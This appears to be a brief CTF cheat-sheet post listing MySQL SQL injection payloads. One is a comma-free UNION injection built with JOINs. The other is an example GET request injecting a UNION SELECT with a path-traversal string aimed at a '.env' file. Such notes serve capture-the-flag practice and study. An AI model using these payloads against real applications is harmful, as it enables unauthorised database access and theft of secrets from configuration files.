---
title: "MySQL stuff for CTF"
date: 2025-11-04 10:00:00 -0500
categories: [windows, ctf]
tags: [linux, ctf, mysql, htb, sql]
description: "Dump of important commands and tools in MySQL CTF challenges."
---

## Union Based SQLi without commas 

```sql
UNION (SELECT * FROM (SELECT 1) AS A JOIN (SELECT 2) AS B JOIN (SELECT 3) AS C)
```

### Example Sqli

```sql
GET api/test/' UNION SELECT * FROM (SELECT 1) AS A JOIN (SELECT "\.\./.env") AS B)-- -
```
